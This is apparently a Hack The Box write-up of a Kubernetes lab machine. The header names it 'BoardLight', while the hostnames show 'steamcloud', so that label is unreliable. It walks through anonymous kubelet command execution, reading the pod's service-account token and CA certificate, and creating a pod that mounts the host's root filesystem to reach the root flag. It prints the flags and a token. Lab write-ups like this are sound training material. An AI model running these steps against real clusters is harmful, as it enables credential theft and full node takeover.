---
tags:
  - HTB
  - Boot2Root
  - Hacking
  - Linux
  - Kubernetes
  - Kubeletctl
  - Kubectl
---
# Overview

| Name        | BoardLight |
| ----------- | ---------- |
| OS          | Linux      |
| Base Points | Easy [20]  |
| Status      | Done       |
# Recon
## Nmap

```bash
$ sudo nmap -sC -sV -p- -T4 10.129.96.167
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-17 07:47 CDT
Warning: 10.129.96.167 giving up on port because retransmission cap hit (6).
Stats: 0:02:13 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 78.45% done; ETC: 07:50 (0:00:37 remaining)
Stats: 0:03:40 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 90.54% done; ETC: 07:51 (0:00:23 remaining)
Nmap scan report for 10.129.96.167
Host is up (0.077s latency).
Not shown: 65488 closed tcp ports (reset), 40 filtered tcp ports (no-response)
PORT      STATE SERVICE          VERSION
22/tcp    open  ssh              OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 fc:fb:90:ee:7c:73:a1:d4:bf:87:f8:71:e8:44:c6:3c (RSA)
|   256 46:83:2b:1b:01:db:71:64:6a:3e:27:cb:53:6f:81:a1 (ECDSA)
|_  256 1d:8d:d3:41:f3:ff:a4:37:e8:ac:78:08:89:c2:e3:c5 (ED25519)
2379/tcp  open  ssl/etcd-client?
| ssl-cert: Subject: commonName=steamcloud
| Subject Alternative Name: DNS:localhost, DNS:steamcloud, IP Address:10.129.96.167, IP Address:127.0.0.1, IP Address:0:0:0:0:0:0:0:1
| Not valid before: 2025-10-17T12:30:27
|_Not valid after:  2026-10-17T12:30:27
| tls-alpn: 
|_  h2
|_ssl-date: TLS randomness does not represent time
2380/tcp  open  ssl/etcd-server?
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=steamcloud
| Subject Alternative Name: DNS:localhost, DNS:steamcloud, IP Address:10.129.96.167, IP Address:127.0.0.1, IP Address:0:0:0:0:0:0:0:1
| Not valid before: 2025-10-17T12:30:27
|_Not valid after:  2026-10-17T12:30:27
| tls-alpn: 
|_  h2
8443/tcp  open  ssl/https-alt
|_ssl-date: TLS randomness does not represent time
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 403 Forbidden
|     Audit-Id: 2190005c-24cc-41b1-a7fb-89e7d7761959
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     X-Kubernetes-Pf-Flowschema-Uid: 756f768a-d411-45a3-af69-2a983c56233e
|     X-Kubernetes-Pf-Prioritylevel-Uid: 3174d458-862b-457f-905f-bb7aed4d9ab8
|     Date: Fri, 17 Oct 2025 12:52:30 GMT
|     Content-Length: 212
|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot get path "/nice ports,/Trinity.txt.bak"","reason":"Forbidden","details":{},"code":403}
|   GetRequest: 
|     HTTP/1.0 403 Forbidden
|     Audit-Id: e79319d5-4d10-4a88-a22c-94ec7a283f22
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     X-Kubernetes-Pf-Flowschema-Uid: 756f768a-d411-45a3-af69-2a983c56233e
|     X-Kubernetes-Pf-Prioritylevel-Uid: 3174d458-862b-457f-905f-bb7aed4d9ab8
|     Date: Fri, 17 Oct 2025 12:52:30 GMT
|     Content-Length: 185
|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot get path "/"","reason":"Forbidden","details":{},"code":403}
|   HTTPOptions: 
|     HTTP/1.0 403 Forbidden
|     Audit-Id: b6e4c50e-27c8-4b98-99f6-b68c09eb2c00
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     X-Kubernetes-Pf-Flowschema-Uid: 756f768a-d411-45a3-af69-2a983c56233e
|     X-Kubernetes-Pf-Prioritylevel-Uid: 3174d458-862b-457f-905f-bb7aed4d9ab8
|     Date: Fri, 17 Oct 2025 12:52:30 GMT
|     Content-Length: 189
|_    {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot options path "/"","reason":"Forbidden","details":{},"code":403}
| tls-alpn: 
|   h2
|_  http/1.1
|_http-title: Site doesn't have a title (application/json).
| ssl-cert: Subject: commonName=minikube/organizationName=system:masters
| Subject Alternative Name: DNS:minikubeCA, DNS:control-plane.minikube.internal, DNS:kubernetes.default.svc.cluster.local, DNS:kubernetes.default.svc, DNS:kubernetes.default, DNS:kubernetes, DNS:localhost, IP Address:10.129.96.167, IP Address:10.96.0.1, IP Address:127.0.0.1, IP Address:10.0.0.1
| Not valid before: 2025-10-16T12:30:25
|_Not valid after:  2028-10-16T12:30:25
10249/tcp open  http             Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
10250/tcp open  ssl/http         Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
| tls-alpn: 
|   h2
|_  http/1.1
| ssl-cert: Subject: commonName=steamcloud@1760704230
| Subject Alternative Name: DNS:steamcloud
| Not valid before: 2025-10-17T11:30:29
|_Not valid after:  2026-10-17T11:30:29
|_ssl-date: TLS randomness does not represent time
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
10256/tcp open  http             Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8443-TCP:V=7.94SVN%T=SSL%I=7%D=10/17%Time=68F23C0D%P=x86_64-pc-linu
SF:x-gnu%r(GetRequest,22F,"HTTP/1\.0\x20403\x20Forbidden\r\nAudit-Id:\x20e
SF:79319d5-4d10-4a88-a22c-94ec7a283f22\r\nCache-Control:\x20no-cache,\x20p
SF:rivate\r\nContent-Type:\x20application/json\r\nX-Content-Type-Options:\
SF:x20nosniff\r\nX-Kubernetes-Pf-Flowschema-Uid:\x20756f768a-d411-45a3-af6
SF:9-2a983c56233e\r\nX-Kubernetes-Pf-Prioritylevel-Uid:\x203174d458-862b-4
SF:57f-905f-bb7aed4d9ab8\r\nDate:\x20Fri,\x2017\x20Oct\x202025\x2012:52:30
SF:\x20GMT\r\nContent-Length:\x20185\r\n\r\n{\"kind\":\"Status\",\"apiVers
SF:ion\":\"v1\",\"metadata\":{},\"status\":\"Failure\",\"message\":\"forbi
SF:dden:\x20User\x20\\\"system:anonymous\\\"\x20cannot\x20get\x20path\x20\
SF:\\"/\\\"\",\"reason\":\"Forbidden\",\"details\":{},\"code\":403}\n")%r(
SF:HTTPOptions,233,"HTTP/1\.0\x20403\x20Forbidden\r\nAudit-Id:\x20b6e4c50e
SF:-27c8-4b98-99f6-b68c09eb2c00\r\nCache-Control:\x20no-cache,\x20private\
SF:r\nContent-Type:\x20application/json\r\nX-Content-Type-Options:\x20nosn
SF:iff\r\nX-Kubernetes-Pf-Flowschema-Uid:\x20756f768a-d411-45a3-af69-2a983
SF:c56233e\r\nX-Kubernetes-Pf-Prioritylevel-Uid:\x203174d458-862b-457f-905
SF:f-bb7aed4d9ab8\r\nDate:\x20Fri,\x2017\x20Oct\x202025\x2012:52:30\x20GMT
SF:\r\nContent-Length:\x20189\r\n\r\n{\"kind\":\"Status\",\"apiVersion\":\
SF:"v1\",\"metadata\":{},\"status\":\"Failure\",\"message\":\"forbidden:\x
SF:20User\x20\\\"system:anonymous\\\"\x20cannot\x20options\x20path\x20\\\"
SF:/\\\"\",\"reason\":\"Forbidden\",\"details\":{},\"code\":403}\n")%r(Fou
SF:rOhFourRequest,24A,"HTTP/1\.0\x20403\x20Forbidden\r\nAudit-Id:\x2021900
SF:05c-24cc-41b1-a7fb-89e7d7761959\r\nCache-Control:\x20no-cache,\x20priva
SF:te\r\nContent-Type:\x20application/json\r\nX-Content-Type-Options:\x20n
SF:osniff\r\nX-Kubernetes-Pf-Flowschema-Uid:\x20756f768a-d411-45a3-af69-2a
SF:983c56233e\r\nX-Kubernetes-Pf-Prioritylevel-Uid:\x203174d458-862b-457f-
SF:905f-bb7aed4d9ab8\r\nDate:\x20Fri,\x2017\x20Oct\x202025\x2012:52:30\x20
SF:GMT\r\nContent-Length:\x20212\r\n\r\n{\"kind\":\"Status\",\"apiVersion\
SF:":\"v1\",\"metadata\":{},\"status\":\"Failure\",\"message\":\"forbidden
SF::\x20User\x20\\\"system:anonymous\\\"\x20cannot\x20get\x20path\x20\\\"/
SF:nice\x20ports,/Trinity\.txt\.bak\\\"\",\"reason\":\"Forbidden\",\"detai
SF:ls\":{},\"code\":403}\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We can see the ports `2379` and `2380` owned by the `etcd` service, a Kubernetes component. `etcd` is an open source distributed key-value store used to hold and manage the critical information that distributed systems need to keep running.

## `8443`

```bash
$ curl -s -k -X GET "https://10.129.96.167:8443/" | jq
{
  "kind": "Status",
  "apiVersion": "v1",
  "metadata": {},
  "status": "Failure",
  "message": "forbidden: User \"system:anonymous\" cannot get path \"/\"",
  "reason": "Forbidden",
  "details": {},
  "code": 403
}
```
## `10250`

```bash
$ curl -s -k -X GET "https://10.129.96.167:10250/"
404 page not found
```
# Enumeration

```bash
$ ffuf -c -ic -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u https://10.129.96.167:10250/FUZZ

stats                   [Status: 301, Size: 42, Words: 3, Lines: 3, Duration: 76ms]
logs                    [Status: 301, Size: 41, Words: 3, Lines: 3, Duration: 76ms]
metrics                 [Status: 200, Size: 221137, Words: 3033, Lines: 1749, Duration: 96ms]
http%3A%2F%2Fwww        [Status: 301, Size: 45, Words: 3, Lines: 3, Duration: 77ms]
pods                    [Status: 200, Size: 37878, Words: 1, Lines: 2, Duration: 77ms]
```

There are many kubernetes things happening so we need tool Kubeletctl and Kubectl.
## [Kubeletctl](https://github.com/cyberark/kubeletctl)

```bash
curl -LO https://github.com/cyberark/kubeletctl/releases/download/v1.13/kubeletctl_linux_amd64 && sudo chmod a+x ./kubeletctl_linux_amd64 && sudo mv ./kubeletctl_linux_amd64 /usr/local/bin/kubeletctl
```

```bash
$ kubeletctl --server 10.129.96.167 pods
┌────────────────────────────────────────────────────────────────────────────────┐
│                                Pods from Kubelet                               │
├───┬────────────────────────────────────┬─────────────┬─────────────────────────┤
│   │ POD                                │ NAMESPACE   │ CONTAINERS              │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 1 │ storage-provisioner                │ kube-system │ storage-provisioner     │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 2 │ kube-proxy-9n9q8                   │ kube-system │ kube-proxy              │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 3 │ coredns-78fcd69978-85d2j           │ kube-system │ coredns                 │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 4 │ nginx                              │ default     │ nginx                   │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 5 │ etcd-steamcloud                    │ kube-system │ etcd                    │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 6 │ kube-apiserver-steamcloud          │ kube-system │ kube-apiserver          │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 7 │ kube-controller-manager-steamcloud │ kube-system │ kube-controller-manager │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 8 │ kube-scheduler-steamcloud          │ kube-system │ kube-scheduler          │
│   │                                    │             │                         │
└───┴────────────────────────────────────┴─────────────┴─────────────────────────┘
```

`nginx` seems interesting. It’s the only service that’s not a pod it self. let’s to enumerate over the pod and see if we can find any other information, like RCE.
## RCE

```bash
$ kubeletctl --server 10.129.96.167 exec "id" -p nginx -c nginx
uid=0(root) gid=0(root) groups=0(root)
```

We can indeed perform RCE>

```bash
$ kubeletctl --server 10.129.96.167 exec "ls /root" -p nginx -c nginx
user.txt

$ kubeletctl --server 10.129.96.167 exec "cat /root/user.txt" -p nginx -c nginx
c9e39ad463b336a885800813337f419d
```
# Privilege Escalation

```bash
$ kubeletctl --server 10.129.96.167 exec "/bin/bash" -p nginx -c nginx
root@nginx:/# 
```

From GPT We get The location of the ServiceAccount object, which is managed by Kubernetes and provides identity within the pod. It gives three typical directories:

- `/run/secrets/kubernetes.io/serviceaccount`
- `/var/run/secrets/kubernetes.io/serviceaccount`
- `/secrets/kubernetes.io/serviceaccout`

In our case its the first one:

```bash
root@nginx:/# ls /run/secrets/kubernetes.io/serviceaccount
ls /run/secrets/kubernetes.io/serviceaccount
ca.crt	namespace  token
root@nginx:/# cat /run/secrets/kubernetes.io/serviceaccount/ca.crt
cat /run/secrets/kubernetes.io/serviceaccount/ca.crt
-----BEGIN CERTIFICATE-----
MIIDBjCCAe6gAwIBAgIBATANBgkqhkiG9w0BAQsFADAVMRMwEQYDVQQDEwptaW5p
a3ViZUNBMB4XDTIxMTEyOTEyMTY1NVoXDTMxMTEyODEyMTY1NVowFTETMBEGA1UE
AxMKbWluaWt1YmVDQTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAOoa
YRSqoSUfHaMBK44xXLLuFXNELhJrC/9O0R2Gpt8DuBNIW5ve+mgNxbOLTofhgQ0M
HLPTTxnfZ5VaavDH2GHiFrtfUWD/g7HA8aXn7cOCNxdf1k7M0X0QjPRB3Ug2cID7
deqATtnjZaXTk0VUyUp5Tq3vmwhVkPXDtROc7QaTR/AUeR1oxO9+mPo3ry6S2xqG
VeeRhpK6Ma3FpJB3oN0Kz5e6areAOpBP5cVFd68/Np3aecCLrxf2Qdz/d9Bpisll
hnRBjBwFDdzQVeIJRKhSAhczDbKP64bNi2K1ZU95k5YkodSgXyZmmkfgYORyg99o
1pRrbLrfNk6DE5S9VSUCAwEAAaNhMF8wDgYDVR0PAQH/BAQDAgKkMB0GA1UdJQQW
MBQGCCsGAQUFBwMCBggrBgEFBQcDATAPBgNVHRMBAf8EBTADAQH/MB0GA1UdDgQW
BBSpRKCEKbVtRsYEGRwyaVeonBdMCjANBgkqhkiG9w0BAQsFAAOCAQEA0jqg5pUm
lt1jIeLkYT1E6C5xykW0X8mOWzmok17rSMA2GYISqdbRcw72aocvdGJ2Z78X/HyO
DGSCkKaFqJ9+tvt1tRCZZS3hiI+sp4Tru5FttsGy1bV5sa+w/+2mJJzTjBElMJ/+
9mGEdIpuHqZ15HHYeZ83SQWcj0H0lZGpSriHbfxAIlgRvtYBfnciP6Wgcy+YuU/D
xpCJgRAw0IUgK74EdYNZAkrWuSOA0Ua8KiKuhklyZv38Jib3FvAo4JrBXlSjW/R0
JWSyodQkEF60Xh7yd2lRFhtyE8J+h1HeTz4FpDJ7MuvfXfoXxSDQOYNQu09iFiMz
kf2eZIBNMp0TFg==
-----END CERTIFICATE-----
```

```bash
root@nginx:/# cat /run/secrets/kubernetes.io/serviceaccount/token
cat /run/secrets/kubernetes.io/serviceaccount/token
eyJhbGciOiJSUzI1NiIsImtpZCI6ImtHanM2TWhtYXRrQzY4bTlFcW80eTVHOWYxNUJhWGk4M21JWmRobHRpb0UifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNzkyMjQwMjY0LCJpYXQiOjE3NjA3MDQyNjQsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJuZ2lueCIsInVpZCI6IjQxMzIwYzkxLWM3MDItNGE3OC05ZWZhLTRiMzU2YWIyOWEyNyJ9LCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiZGVmYXVsdCIsInVpZCI6IjVjMDMzNGNkLTc5ZWQtNDNhZi04M2IxLWQ1MzhlZWJjNmE0MCJ9LCJ3YXJuYWZ0ZXIiOjE3NjA3MDc4NzF9LCJuYmYiOjE3NjA3MDQyNjQsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.UK9TlX1MwoCS9uG6J4ejDfv7xyKCbsOHQ525k8JenHY3zmAnKDSa3_wLuPXI5H9qdik-zW2aRZdUqlIQDiWuSdIvrLtyZ3I3UzbIowbVXfFR3q-ApKJP4T0xHZ5O7FbnIaTDGugCvxArc0uly6kNa9EdLa9j6lqB0_JEL3a5KE_CF77jNUQn8jCCx_RSR8aMtnEsLuRwN7o2lQSBKMsahZShGqJYYcYP2aXWfAt7AvUsRLFhWbEvIMSCfF3_dWhrijFkJzc2IFA8tzWixeVAh1hK0VJuuespPD0JZy7sCeRUkt4YH1pXipO_NBXOWoFsQiFwrk4ui1rmEoxinNtErQ
```

Export the token:

```bash
$ export token=$(kubeletctl -s 10.129.96.167 exec "cat /run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx)
```

Save that `ca.crt` in file.

Now we can authenticate in that port `8443`.
## Kubectl

```bash
sudo curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
```

```bash
$ ./kubectl --server https://10.129.96.167:8443 --certificate-authority=ca.crt --token=$token auth
Inspect authorization.

Available Commands:
  can-i         Check whether an action is allowed
  reconcile     Reconciles rules for RBAC role, role binding, cluster role, and
cluster role binding objects
  whoami        Experimental: Check self subject attributes

Usage:
  kubectl auth [flags] [options]

Use "kubectl auth <command> --help" for more information about a given command.
```

```bash
$ ./kubectl --server https://10.129.96.167:8443 --certificate-authority=ca.crt --token=$token get pod
NAME    READY   STATUS    RESTARTS   AGE
nginx   1/1     Running   0          71m
```

```bash
$ ./kubectl --server https://10.129.96.167:8443 --certificate-authority=ca.crt --token=$token auth can-i --list
Resources                                       Non-Resource URLs                     Resource Names   Verbs
selfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]
pods                                            []                                    []               [get create list]
                                                [/.well-known/openid-configuration]   []               [get]
                                                [/api/*]                              []               [get]
                                                [/api]                                []               [get]
                                                [/apis/*]                             []               [get]
                                                [/apis]                               []               [get]
                                                [/healthz]                            []               [get]
                                                [/healthz]                            []               [get]
                                                [/livez]                              []               [get]
                                                [/livez]                              []               [get]
                                                [/openapi/*]                          []               [get]
                                                [/openapi]                            []               [get]
                                                [/openid/v1/jwks]                     []               [get]
                                                [/readyz]                             []               [get]
                                                [/readyz]                             []               [get]
                                                [/version/]                           []               [get]
                                                [/version/]                           []               [get]
                                                [/version]                            []               [get]
                                                [/version]                            []               [get]
```

We have the possibility to read, create and list pods,

Lets see YAML.

```bash
$ ./kubectl --server https://10.129.96.167:8443 --certificate-authority=ca.crt --token=$token get pods -o yaml
apiVersion: v1
items:
- apiVersion: v1
  kind: Pod
  metadata:
    annotations:
      kubectl.kubernetes.io/last-applied-configuration: |
        {"apiVersion":"v1","kind":"Pod","metadata":{"annotations":{},"name":"nginx","namespace":"default"},"spec":{"containers":[{"image":"nginx:1.14.2","imagePullPolicy":"Never","name":"nginx","volumeMounts":[{"mountPath":"/root","name":"flag"}]}],"volumes":[{"hostPath":{"path":"/opt/flag"},"name":"flag"}]}}
    creationTimestamp: "2025-10-17T12:31:04Z"
    name: nginx
    namespace: default
    resourceVersion: "507"
    uid: 41320c91-c702-4a78-9efa-4b356ab29a27
  spec:
    containers:
    - image: nginx:1.14.2
      imagePullPolicy: Never
      name: nginx
      resources: {}
      terminationMessagePath: /dev/termination-log
      terminationMessagePolicy: File
      volumeMounts:
      - mountPath: /root
        name: flag
      - mountPath: /var/run/secrets/kubernetes.io/serviceaccount
        name: kube-api-access-62k7k
        readOnly: true
    dnsPolicy: ClusterFirst
    enableServiceLinks: true
    nodeName: steamcloud
    preemptionPolicy: PreemptLowerPriority
    priority: 0
    restartPolicy: Always
    schedulerName: default-scheduler
    securityContext: {}
    serviceAccount: default
    serviceAccountName: default
    terminationGracePeriodSeconds: 30
    tolerations:
    - effect: NoExecute
      key: node.kubernetes.io/not-ready
      operator: Exists
      tolerationSeconds: 300
    - effect: NoExecute
      key: node.kubernetes.io/unreachable
      operator: Exists
      tolerationSeconds: 300
    volumes:
    - hostPath:
        path: /opt/flag
        type: ""
      name: flag
    - name: kube-api-access-62k7k
      projected:
        defaultMode: 420
        sources:
        - serviceAccountToken:
            expirationSeconds: 3607
            path: token
        - configMap:
            items:
            - key: ca.crt
              path: ca.crt
            name: kube-root-ca.crt
        - downwardAPI:
            items:
            - fieldRef:
                apiVersion: v1
                fieldPath: metadata.namespace
              path: namespace
  status:
    conditions:
    - lastProbeTime: null
      lastTransitionTime: "2025-10-17T12:31:04Z"
      status: "True"
      type: Initialized
    - lastProbeTime: null
      lastTransitionTime: "2025-10-17T12:31:06Z"
      status: "True"
      type: Ready
    - lastProbeTime: null
      lastTransitionTime: "2025-10-17T12:31:06Z"
      status: "True"
      type: ContainersReady
    - lastProbeTime: null
      lastTransitionTime: "2025-10-17T12:31:04Z"
      status: "True"
      type: PodScheduled
    containerStatuses:
    - containerID: docker://3c7b647b8a2c779f7035e0bdf0ae541e5ef9672a267da9a5b38fcf7660aeb560
      image: nginx:1.14.2
      imageID: docker-pullable://nginx@sha256:f7988fb6c02e0ce69257d9bd9cf37ae20a60f1df7563c3a2a6abe24160306b8d
      lastState: {}
      name: nginx
      ready: true
      restartCount: 0
      started: true
      state:
        running:
          startedAt: "2025-10-17T12:31:06Z"
    hostIP: 10.129.96.167
    phase: Running
    podIP: 172.17.0.3
    podIPs:
    - ip: 172.17.0.3
    qosClass: BestEffort
    startTime: "2025-10-17T12:31:04Z"
kind: List
metadata:
  resourceVersion: ""
```

Let's create our own pod and then upload it then get RCE from it. Our `atom.yml`:

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: atom-pod
  namespace: default
spec:
  containers:
  - name: atom-pod
    image: nginx:1.14.2
    volumeMounts:
    - name: atom-privesc
      mountPath: /mnt
  volumes:
  - name: atom-privesc
    hostPath:
      path: /
```

```bash
$ ./kubectl --server https://10.129.96.167:8443 --certificate-authority=ca.crt --token=$token apply -f atom.yml 
pod/atom-pod created
```

```bash
$ kubeletctl --server 10.129.96.167 pods
┌────────────────────────────────────────────────────────────────────────────────┐
│                                Pods from Kubelet                               │
├───┬────────────────────────────────────┬─────────────┬─────────────────────────┤
│   │ POD                                │ NAMESPACE   │ CONTAINERS              │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 1 │ kube-controller-manager-steamcloud │ kube-system │ kube-controller-manager │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 2 │ storage-provisioner                │ kube-system │ storage-provisioner     │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 3 │ nginx                              │ default     │ nginx                   │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 4 │ etcd-steamcloud                    │ kube-system │ etcd                    │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 5 │ kube-apiserver-steamcloud          │ kube-system │ kube-apiserver          │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 6 │ coredns-78fcd69978-85d2j           │ kube-system │ coredns                 │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 7 │ atom-pod                           │ default     │ atom-pod                │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 8 │ kube-scheduler-steamcloud          │ kube-system │ kube-scheduler          │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 9 │ kube-proxy-9n9q8                   │ kube-system │ kube-proxy              │
│   │                                    │             │                         │
└───┴────────────────────────────────────┴─────────────┴─────────────────────────┘
```

We can see our pod `atom-pod`.

```bash
$ kubeletctl --server 10.129.96.167 exec "/bin/bash" -p atom-pod -c atom-pod
root@atom-pod:/# ls
ls
bin   dev  home  lib64	mnt  proc  run	 srv  tmp  var
boot  etc  lib	 media	opt  root  sbin  sys  usr
```

From above `yml` output we can see that root is in `/mnt` and that is where our flag is located.

```bash
root@atom-pod:/home# cd /mnt
cd /mnt
root@atom-pod:/mnt# ls
ls
bin   home	      lib32	  media  root  sys  vmlinuz
boot  initrd.img      lib64	  mnt	 run   tmp  vmlinuz.old
dev   initrd.img.old  libx32	  opt	 sbin  usr
etc   lib	      lost+found  proc	 srv   var
root@atom-pod:/mnt# cd root
cd root
root@atom-pod:/mnt/root# ls
ls
root.txt
root@atom-pod:/mnt/root# cat root.txt
cat root.txt
8d16aefb54f14957150b921ee93b1be4
```

---
